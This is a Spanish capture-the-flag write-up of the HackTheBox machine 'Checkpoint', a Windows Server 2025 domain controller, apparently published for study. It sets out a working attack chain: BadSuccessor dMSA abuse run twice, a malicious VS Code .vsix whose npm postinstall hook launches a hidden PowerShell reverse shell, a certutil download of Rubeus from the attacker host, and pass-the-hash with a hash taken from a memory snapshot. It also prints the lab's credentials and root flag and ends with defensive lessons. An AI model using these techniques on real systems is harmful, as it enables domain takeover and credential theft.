---
title: "Checkpoint — HackTheBox (Windows / Active Directory)"
machine: "Checkpoint"
platform: "HackTheBox"
os: "Windows"
difficulty: "Unknown"
tags: ["SMB", "Active Directory", "RCE", "Privesc", "Web"]
retired: true
summary: "Dominio: checkpoint.htb / DC01.checkpoint.htb (10.129.16.197)"
draft: false
---
> **Autor:** 4Pr3nd1z 
**SO:** Windows Server 2025 (Build 26100) — Domain Controller
**Dominio:** `checkpoint.htb` / `DC01.checkpoint.htb` (`10.129.16.197`)
**Temática:** Abuso de delegación **dMSA (BadSuccessor)** encadenado, ejecución de código vía **extensión `.vsix` de VS Code**, y credenciales en un **volcado de memoria de VM**.
> 

---

## Índice

---

## Descripción general

Checkpoint es un DC de **Windows Server 2025** cuyo hilo conductor es el abuso de **delegated Managed Service Accounts (dMSA)** mediante la técnica **BadSuccessor** (Akamai, 2025), encadenada **dos veces**: primero para impersonar a un usuario con escritura en un recurso compartido, y luego para saltar a una cuenta de servicio con acceso a backups. El foothold se obtiene subiendo una **extensión maliciosa de VS Code (`.vsix`)** a un share que una tarea automatizada del DC instala, disparando una reverse shell vía el hook `postinstall` de npm. La escalada final sale de un **snapshot de memoria de una VM** olvidado en un recurso de backups, del que se extrae el hash NT del `Administrator` para un **Pass-the-Hash**.

Lo interesante del box es que **descarta deliberadamente las rutas "clásicas"**: el reset de contraseña está bloqueado por el transporte, el kerberoasting es incrackeable, no hay ADCS, y el NTLM relay está muerto por *signing enforced*. Todo el progreso viene del abuso de ACLs de directorio y delegación dMSA.

**Condiciones del entorno (relevantes para todo el writeup):**

| Propiedad | Valor | Implicación |
| --- | --- | --- |
| SMB signing | `True` (enforced) | Sin NTLM relay a SMB |
| LDAP signing | Enforced | Sin NTLM relay a LDAP |
| Canal TLS LDAP | Sin certificado | LDAPS resetea → se opera por LDAP 389 |
| Account Lockout | `None` | Spray seguro (no se usó al final, pero relevante) |
| ADCS | No presente | Shadow Credentials (PKINIT) inviable |
| Build DC | 26100 (parcheado) | BadSuccessor requiere enlace **bidireccional** |

---

## Reconocimiento

### Escaneo de puertos

```bash
nmap -p- --min-rate 5000 10.129.16.197 -oN init.nmap
nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -sCV 10.129.16.197 -oN services.nmap
```

```
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
5985/tcp open  wsman          # WinRM
9389/tcp open  adws
```

Perfil de **Domain Controller** clásico. El puerto **5985 (WinRM)** abierto será clave para la fase final.

```bash
echo "10.129.16.197 DC01.checkpoint.htb checkpoint.htb DC01" | sudo tee -a /etc/hosts
```

---

## Punto de partida: `alex.turner`

El box entrega credenciales iniciales:

```
alex.turner : Checkpoint2024!
```

Solicitamos un TGT por Kerberos (todo el box se opera con tickets, no NTLM):

```bash
getTGT.py checkpoint.htb/alex.turner:'Checkpoint2024!' -dc-ip 10.129.16.197
export KRB5CCNAME=alex.turner.ccache
klist
```

> ⚠️ **Nota de skew:** si Kerberos devuelve `KRB_AP_ERR_SKEW`, sincroniza el reloj con el DC antes de nada:
> 
> 
> ```bash
> sudo ntpdate -u 10.129.16.197
> ```
> 
> En esta máquina el offset llegó a ser de **~7 horas** tras reiniciar el atacante, y bloqueaba toda operación Kerberos.
> 

### Enumeración de shares

```bash
nxc smb DC01.checkpoint.htb -k --use-kcache --shares
```

| Share | Permisos | Remark |
| --- | --- | --- |
| ADMIN$ / C$ | — | — |
| **DevDrop** | **READ** | *VS Code extensions share for approved .vsix packages compatible with VS Code engine 1.118.0* |
| **VMBackups** | (sin acceso) | — |
| NETLOGON / SYSVOL | READ | — |

Dos shares no estándar: **DevDrop** (solo lectura, pide `.vsix` para VS Code 1.118.0 → ejecución de código) y **VMBackups** (denegado). El remark de DevDrop es la pista del foothold.

---

## Enumeración de Active Directory

Con BloodHound recolectado vía el módulo nativo de bloodyAD (el transporte LDAP que funciona en este box, ya que `bloodhound-python` cae a LDAPS y resetea):

```bash
bloodyAD -H DC01.checkpoint.htb -d checkpoint.htb -i 10.129.16.197 -k ccache=$KRB5CCNAME get bloodhound --path bh_out
```

**Primitivas de `alex.turner` (de la DACL real):**

- `GenericWrite` sobre `mark.davies`
- `CreateChild` **genérico** (`ObjectType: Self`) sobre `OU=Employees`
- `WRITE` sobre el registro DNS `wpad` + `CreateChild` en `DomainDnsZones`
- `Reanimate-Tombstones` (usado por el box para restaurar `mark.davies`)
- Miembro de `IT-Staff`, `VPN-Users`, `Domain Users`

**Mapa de grupos y relaciones clave:**

```
ryan.brooks  ──GenericWrite──►  svc_deploy
ryan.brooks  ──CreateChild────►  OU=DMSAHolder
svc_deploy   ∈ BackupAccess            (→ share VMBackups)
svc_deploy   ∈ Remote Management Users (→ WinRM / evil-winrm)
DevTeam      = { brian.jenkins, michael.torres, ryan.brooks }
Domain Admins = { max.palmer, Administrator }
```

> El grafo no dibuja la escritura sobre DNS como arista explotable, pero existe en la DACL. Las ~12 cuentas de empleado (IT/Finance/HR/Engineering staff) son **relleno/distractores**: ninguna está en la cadena.
> 

---

## Callejones sin salida (y por qué)

Documentar lo que **no** funciona es tan importante como lo que sí. Cada una de estas vías se intentó y se descartó con evidencia:

| Técnica | Resultado | Razón |
| --- | --- | --- |
| **Reset de password** de `mark.davies` (LDAP `set password`) | ❌ "Password can't be changed... oldpass not valid" | bloodyAD hace *change* (delete+add), no *reset*; el *reset* real (replace de `unicodePwd`) exige canal sellado, y LDAPS resetea por falta de cert |
| **Reset por SAMR** (`changepasswd -reset`) | ❌ Access denied / RPC no permite reset en config por defecto | Falta el derecho *User-Force-Change-Password*; GenericWrite ≠ reset |
| **Targeted Kerberoast** de `mark.davies` | ❌ Incrackeable | El KDC solo emite **AES256** (`$krb5tgs$18$`); rockyou no contiene la pass (confirmado también por otros jugadores) |
| **Shadow Credentials** (`msDS-KeyCredentialLink`) | ❌ `KDC_ERR_PADATA_TYPE_NOSUPP` | No hay **ADCS** → PKINIT no soportado |
| **NTLM Relay** (ADIDNS `wpad` + Responder) | ❌ Inviable | **Signing enforced** en SMB y LDAP mata el relay |
| **DNSAdmins → DLL en servicio DNS** | ❌ | Grupo **vacío** |
| **AS-REP Roast** | ❌ | **Cero** cuentas con preauth deshabilitada |

La conclusión: el camino pasa **obligatoriamente** por abuso de delegación dMSA (BadSuccessor), porque es la única primitiva de escritura que sí surte efecto sobre LDAP 389 plano (atributos no confidenciales).

---

## Vector 1 — BadSuccessor sobre `mark.davies`

### Concepto

**BadSuccessor** abusa de los **dMSA** de Server 2025. Al enlazar un dMSA a una cuenta "sucedida" vía `msDS-ManagedAccountPrecededByLink` + `msDS-DelegatedMSAState=2`, el KDC incluye en el **PAC del dMSA los SIDs y grupos de la cuenta enlazada**. Autenticando como el dMSA, heredas su contexto **sin su contraseña**.

> **Clave en DC parcheado (build ≥ 26100.4946):** el KDC valida un **enlace bidireccional**. Hay que escribir también en la cuenta objetivo:
`msDS-SupersededManagedAccountLink` + `msDS-SupersededServiceAccountState=2`.
Por eso solo podemos suceder cuentas sobre las que tenemos escritura. `alex.turner` tiene `GenericWrite` sobre `mark.davies` → es el único objetivo viable (suceder a un DA falla por falta de escritura sobre él).
> 

### Explotación

```bash
export KRB5CCNAME=alex.turner.ccache

# Crear el dMSA enlazado a mark.davies (bloodyAD se auto-concede GroupMSAMembership)
bloodyAD -H DC01.checkpoint.htb -d checkpoint.htb -i 10.129.16.197 \
  -u alex.turner -k ccache=$KRB5CCNAME \
  add badSuccessor evildmsa --ou 'OU=Employees,DC=checkpoint,DC=htb' \
  -t 'CN=Mark Davies,OU=Employees,DC=checkpoint,DC=htb' --prepatch

# Cerrar el lado de mark.davies (GenericWrite lo permite)
bloodyAD ... set object 'CN=Mark Davies,OU=Employees,DC=checkpoint,DC=htb' msDS-SupersededManagedAccountLink -v 'CN=evildmsa,OU=Employees,DC=checkpoint,DC=htb'
bloodyAD ... set object 'CN=Mark Davies,OU=Employees,DC=checkpoint,DC=htb' msDS-SupersededServiceAccountState -v 2
```

> ⚠️ **Pitfalls reales encontrados:**
> 
> - Pasar identidad como `u <user> -k ccache=$KRB5CCNAME`. Solo `k ccache=` deja `username` vacío → `(sAMAccountName=None)`.
> - `msDS-ManagedAccountPrecededByLink` es **single-valued**: un único `t`.
> - El subcomando para borrar es `remove object`, **no** `del object`.

### Obtener el ticket heredado

```bash
getST.py -k -no-pass -dc-ip 10.129.16.197 \
  -impersonate 'evildmsa$' -self -dmsa 'checkpoint.htb/alex.turner'
# → guarda evildmsa$@krbtgt_CHECKPOINT.HTB@CHECKPOINT.HTB.ccache
```

Si el enlace bidireccional está completo, el KDC emite el ticket con el PAC de `mark.davies`. Si falta un lado → `KRB_ERR_GENERIC` en el S4U2self.

> 🔑 **Detalle crítico:** hay que usar **el ticket que produce el flujo `getST -dmsa`**, NO re-pedir un TGT plano con `getTGT -aesKey`. El TGT plano pierde el PAC heredado y se autentica como el dMSA pelado (DevDrop devuelve *Access Denied*). Con el ticket del flujo dMSA, `mark.davies` cuenta para las ACLs del share.
> 

---

## Acceso a DevDrop y foothold vía `.vsix`

Con el ticket heredado, DevDrop pasa de READ a **READ,WRITE**:

```bash
export KRB5CCNAME='evildmsa$@krbtgt_CHECKPOINT.HTB@CHECKPOINT.HTB.ccache'
nxc smb DC01.checkpoint.htb -k --use-kcache --shares | grep DevDrop
# DevDrop   READ,WRITE   VS Code extensions share...
```

### Cómo ejecuta código un `.vsix`

Una extensión de VS Code es un **ZIP con estructura VSIX**. El hook **`postinstall` de npm** en `package.json` se ejecuta cuando la tarea automatizada del DC procesa el paquete. Una tarea en `DC01` vigila DevDrop, extrae los `.vsix` "aprobados" y dispara la instalación → ejecución como el usuario que la corre.

> ⚠️ Un ZIP plano **no funciona**: el parser espera la **jerarquía VSIX real**. Estructura que sí dispara:
> 
> 
> ```
> extension/package.json        (con el postinstall)
> extension/extension.js        (activate() como disparador alternativo)
> extension.vsixmanifest
> [Content_Types].xml
> ```
> 

### Construcción del payload

`package.json` (fragmento):

```json
{
  "name": "approved-helper",
  "publisher": "devteam",
  "version": "1.0.0",
  "engines": { "vscode": "^1.118.0" },
  "main": "./extension.js",
  "activationEvents": ["onStartupFinished"],
  "scripts": { "postinstall": "powershell -nop -w hidden -ep bypass -e <BASE64_REVSHELL>" }
}
```

Reverse shell PowerShell → base64 UTF-16LE (LHOST = tun0, LPORT 4444), empaquetado:

```bash
zip -r approved-helper.vsix extension extension.vsixmanifest '[Content_Types].xml'
```

### Despliegue

```bash
# listener (penelope o nc) en el atacante
penelope 4444     # o: nc -lvnp 4444

# subir el .vsix (re-subir = rm + put para re-disparar la tarea)
smbclient.py -k -no-pass -dc-ip 10.129.16.197 'checkpoint.htb/evildmsa$@DC01.checkpoint.htb'
> use DevDrop
> put approved-helper.vsix
```

A los segundos cae la reverse:

```
checkpoint\ryan.brooks
```

> 💡 La shell del `postinstall` es **efímera** (muere al terminar el instalador). Re-subir el `.vsix` (rm+put) la recupera. **Lo primero al caer** es extraer una credencial estable de `ryan.brooks` (ver abajo).
> 

---

## Pivote: `ryan.brooks`

`ryan.brooks` no tiene tickets en caché ni privilegios locales jugosos (`whoami /priv` solo básicos), pero **sí tiene el módulo ActiveDirectory** y derechos de directorio potentes. Para operar estable desde Kali, extraemos su TGT **sin contraseña** con Rubeus `tgtdeleg`:

```powershell
# en la shell de ryan (descargado vía HTTP server del atacante)
certutil -urlcache -f <http://10.10.15.55:8000/Rubeus.exe> r.exe
.\r.exe tgtdeleg /nowrap
# → blob base64 doIF...
```

En Kali, convertir a ccache:

```bash
echo 'doIF...' | base64 -d > ryan.kirbi
ticketConverter.py ryan.kirbi ryan.ccache
export KRB5CCNAME=ryan.ccache
klist   # ryan.brooks@CHECKPOINT.HTB
```

Ahora todo se opera como `ryan.brooks` desde Kali, sin depender de la reverse frágil.

---

## Vector 2 — BadSuccessor sobre `svc_deploy`

`ryan.brooks` reúne las dos primitivas necesarias: **`CreateChild` en `OU=DMSAHolder`** + **`GenericWrite` sobre `svc_deploy`**. Repetimos BadSuccessor apuntando a `svc_deploy`.

> ⚠️ Crear el dMSA con `New-ADServiceAccount` (PowerShell) deja el objeto con una DACL que **no permite reescribir sus atributos** después (`insufficientAccessRights`). La solución limpia: crearlo con `bloodyAD add badSuccessor`, que en un solo paso crea + enlaza + se auto-concede `msDS-GroupMSAMembership`.
> 

```bash
export KRB5CCNAME=ryan.ccache
R="bloodyAD -H DC01.checkpoint.htb -d checkpoint.htb -i 10.129.16.197 -u ryan.brooks -k ccache=$KRB5CCNAME"

# (borrar dMSA previo si existe)
$R remove object 'CN=svcdmsa,OU=DMSAHolder,DC=checkpoint,DC=htb'

# crear + enlazar a svc_deploy
$R add badSuccessor svcdmsa --ou 'OU=DMSAHolder,DC=checkpoint,DC=htb' \
   -t 'CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb' --prepatch

# cerrar el lado de svc_deploy (GenericWrite)
$R set object 'CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb' msDS-SupersededManagedAccountLink -v 'CN=svcdmsa,OU=DMSAHolder,DC=checkpoint,DC=htb'
$R set object 'CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb' msDS-SupersededServiceAccountState -v 2
```

> ⚠️ **OJO con el DN exacto:** `svc_deploy` vive en `OU=ServiceAccounts`, no en `CN=Users`. Un DN incorrecto en el `PrecededByLink` escribe un enlace inválido y el KDC rechaza con `KRB_ERR_GENERIC`. Verificar siempre con `get object svc_deploy --attr distinguishedName`.
> 

Obtener el ticket heredado:

```bash
getST.py -k -no-pass -dc-ip 10.129.16.197 \
  -impersonate 'svcdmsa$' -self -dmsa 'checkpoint.htb/ryan.brooks'
```

Verificación del nuevo contexto:

```bash
export KRB5CCNAME='svcdmsa$@krbtgt_CHECKPOINT.HTB@CHECKPOINT.HTB.ccache'
nxc smb   DC01.checkpoint.htb -k --use-kcache --shares   # VMBackups → READ ✓
nxc winrm DC01.checkpoint.htb -k --use-kcache            # responde ✓
```

`svc_deploy` desbloquea **VMBackups (READ)** por su membresía en `BackupAccess`.

---

## Acceso a VMBackups y volcado de memoria

```bash
nxc smb DC01.checkpoint.htb -k --use-kcache -M spider_plus -o DOWNLOAD_FLAG=True
```

Contenido relevante en `VMBackups/NightlyBackup_2024-11-01/memory forensics/`:

| Archivo | Tamaño | Interés |
| --- | --- | --- |
| `Windows Server 2019-Snapshot1.vmem` | **2 GB** | **Volcado de RAM** ← objetivo |
| `Windows Server 2019-Snapshot1.vmsn` | 131 MB | Snapshot |
| `Windows Server 2019.vmdk` | 9.5 GB | Disco (no necesario) |

> El `spider_plus` solo baja ≤50 KB por defecto; el `.vmem` hay que descargarlo aparte (impacket `get` con la ruta completa, ya que los espacios rompen el `cd`):
> 
> 
> ```bash
> smbclient.py -k -no-pass -dc-ip 10.129.16.197 'checkpoint.htb/svcdmsa$@DC01.checkpoint.htb'
> > use VMBackups
> > get NightlyBackup_2024-11-01\memory forensics\Windows Server 2019-Snapshot1.vmem
> ```
> 

---

## Extracción de credenciales (Volatility + secretsdump)

La build de Volatility3 disponible **no traía** `windows.hashdump`/`lsadump`, así que se extraen los hives del registro y se procesan con `secretsdump`.

```bash
# 1) localizar hives (redirigir el stderr de progreso a /dev/null; es enorme)
vol -f "Windows Server 2019-Snapshot1.vmem" windows.registry.hivelist 2>/dev/null
```

```
Offset            FileFullPath
0xc30a2fe38000    \REGISTRY\MACHINE\SYSTEM
0xc30a3278e000    \SystemRoot\System32\Config\SAM
0xc30a32789000    \SystemRoot\System32\Config\SECURITY
```

```bash
# 2) volcar todos los hives a disco
vol -f "Windows Server 2019-Snapshot1.vmem" -o ./hives windows.registry.hivelist --dump 2>/dev/null

# 3) procesar SAM + SYSTEM + SECURITY
secretsdump.py \
  -sam      hives/registry.SAM.0xc30a3278e000.hive \
  -system   hives/registry.SYSTEM.0xc30a2fe38000.hive \
  -security hives/registry.SECURITY.0xc30a32789000.hive LOCAL
```

Resultado:

```
[*] Target system bootKey: 0x75247bc64fa0086d2c98744d4bcd53f5
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:f29e9c014295b9b32139b09a2790be3b:::
```

El snapshot pertenecía a un host cuyo `Administrator` **reutiliza la contraseña** del `Administrator` del dominio actual.

---

## Pass-the-Hash → Domain Admin

```bash
NT=f29e9c014295b9b32139b09a2790be3b
nxc smb   DC01.checkpoint.htb -u Administrator -H $NT          # (Pwn3d!)
nxc winrm DC01.checkpoint.htb -u Administrator -H $NT          # (Pwn3d!)
```

```
SMB   DC01  [+] checkpoint.htb\Administrator:f29e9c01...90be3b (Pwn3d!)
WINRM DC01  [+] checkpoint.htb\Administrator:f29e9c01...90be3b (Pwn3d!)
```

Shell estable como Domain Admin:

```bash
evil-winrm -i DC01.checkpoint.htb -u Administrator -H $NT
```

---

## Flags

```bash
# USER (pertenece a ryan.brooks)
type C:\Users\ryan.brooks\Desktop\user.txt

# ROOT (en el escritorio de max.palmer, DA)
type C:\Users\max.palmer\Desktop\root.txt
# 0169d370c5b195af59ab5843742a8f96
```

> El `user.txt` requiere el contexto de `ryan.brooks` (o `takeown` como DA). El `root.txt` está en el Desktop de `max.palmer`, no en el de `Administrator`.
> 

---

## Resumen de la cadena de ataque

```
┌────────────────────────────────────────────────────────────────────┐
│ CHECKPOINT — Cadena de Ataque                                        │
├────────────────────────────────────────────────────────────────────┤
│                                                                      │
│ alex.turner (Checkpoint2024!)                                        │
│   │ GenericWrite + CreateChild  →  BadSuccessor #1 (dMSA evildmsa$)  │
│   ▼                                                                  │
│ mark.davies (impersonada vía PAC heredado del dMSA)                  │
│   │ WRITE en DevDrop  →  .vsix con postinstall                       │
│   ▼                                                                  │
│ ryan.brooks (reverse shell por extensión de VS Code) ──► user.txt ✓  │
│   │ Rubeus tgtdeleg → TGT estable                                    │
│   │ CreateChild (DMSAHolder) + GenericWrite (svc_deploy)             │
│   ▼                                                                  │
│ BadSuccessor #2 (dMSA svcdmsa$)                                      │
│   ▼                                                                  │
│ svc_deploy (∈ BackupAccess + Remote Management Users)                │
│   │ READ en VMBackups  →  snapshot .vmem (2 GB)                      │
│   ▼                                                                  │
│ Volatility (hives) + secretsdump  →  hash NT del Administrator       │
│   │ Pass-the-Hash (WinRM / SMB)                                      │
│   ▼                                                                  │
│ DOMAIN ADMIN ──────────────────────────────────────────► root.txt ✓ │
│                                                                      │
└────────────────────────────────────────────────────────────────────┘
```

---

## Lecciones y notas defensivas

- **BadSuccessor / dMSA:** auditar quién tiene `CreateChild` de la clase `msDS-DelegatedManagedServiceAccount` sobre cualquier OU, y monitorizar escrituras a `msDS-ManagedAccountPrecededByLink` / `msDS-SupersededManagedAccountLink`. Mantener los DCs en build ≥ 26100.4946 mitiga (pero no elimina) la técnica.
- **Recursos de despliegue de `.vsix`:** nunca permitir que una tarea automatizada ejecute/instale paquetes desde un share escribible por usuarios de bajo privilegio. Los hooks `postinstall` de npm son ejecución de código.
- **Backups de memoria/VM:** un `.vmem`/`.vmsn` equivale a las credenciales de la máquina. No deben residir en shares accesibles por cuentas de servicio no privilegiadas. Aplicar cifrado y ACLs estrictas.
- **Reutilización de contraseñas:** el `Administrator` del snapshot reutilizaba la del dominio. Rotación independiente y LAPS.
- **GenericWrite ≠ reset:** recordar que `GenericWrite` no concede *force-change-password*, pero **sí** habilita kerberoast dirigido, KeyCredentialLink (con ADCS) y los enlaces dMSA.

---

## Herramientas utilizadas

- `nmap` — escaneo de puertos
- `impacket` (`getTGT.py`, `getST.py`, `smbclient.py`, `secretsdump.py`, `ticketConverter.py`)
- `bloodyAD` — abuso de ACLs y BadSuccessor (`add badSuccessor`, `get bloodhound`)
- `nxc` (NetExec) — enumeración SMB/WinRM, spider, Pass-the-Hash
- `BloodHound CE` — análisis del grafo de privilegios
- `Rubeus` — `tgtdeleg` para extraer TGT sin contraseña
- `Volatility 3` — análisis del volcado de memoria
- `Penelope` — gestión de la reverse shell
- `evil-winrm` — shell final como Domain Admin
- `ntpdate` — sincronización de reloj (clock skew Kerberos)

## ADAutoPwn / Credito especial a herramienta por **C4sh$R**

### 🛠️ ADAutoPwn — Enumeración automatizada de Active Directory

Toda la **fase de reconocimiento inicial** contra `DC01.checkpoint.htb` se apoyó en **ADAutoPwn**. Autenticando por Kerberos como `alex.turner` (TGT en ccache), la herramienta encadenó el reconocimiento completo del dominio y dejó el **loot perfectamente organizado** que sirvió de base para toda la explotación manual posterior. Un arranque rápido y ordenado que ahorró muchísimo tiempo de enumeración a mano.

**Lo que aportó en este box:**

- **Enumeración de dominio completa:** 17 usuarios reales del dominio (`enum/`), políticas de contraseñas, shares SMB —incluido el revelador **`DevDrop`**, el share de extensiones `.vsix` para VS Code que resultó ser el foothold— y el escaneo de puertos del DC.
- **Mapa de superficie de ataque:** comprobaciones de coerción (DFSCoerce, PetitPotam, PrinterBug, MS-EVEN), trusts, ADCS, SCCM, delegación y GPP/DPAPI, todo en una sola pasada.
- **Hallazgo clave 🔑:** detectó el objeto `mark.davies` en `CN=Deleted Objects` y lo restauró a `OU=Employees`, y —lo más importante— volcó las ACLs (`acl_writable_alex.turner.txt`) que revelaron el **control total de `alex.turner` sobre `mark.davies`**: el pivote central de toda la cadena del box. Ahí es donde la herramienta brilló de verdad.
- **Integración con BloodHound:** recolección automática del grafo e importación a su propia UI (**ADAutoGraph**) para visualizar las rutas de ataque de un vistazo.
- **Trazabilidad de serie:** log completo de la sesión (`adautopwn.log`) y un `rollback.log` con todos los cambios realizados, para poder revertir limpiamente el entorno tras la explotación.

> **En resumen:** ADAutoPwn destacó en lo que importa al empezar un AD a ciegas — **mapear el dominio y destapar la relación de ACL que abre el box**. El descubrimiento del control de `alex.turner` sobre `mark.davies` fue el punto de partida de toda la cadena dMSA/BadSuccessor.
> 

---

> ⚠️ **Nota de verificación (para mantener el writeup riguroso):** la explotación real de Checkpoint **no** salió de ningún "secreto recuperado" automáticamente, sino del **abuso manual de la ACL sobre `mark.davies`**. El crédito a la herramienta es por la **enumeración y el descubrimiento del ACL**, que es donde aportó valor real.
> 

---

*Writeup por **4Pr3nd1z**  — Junio 2026*
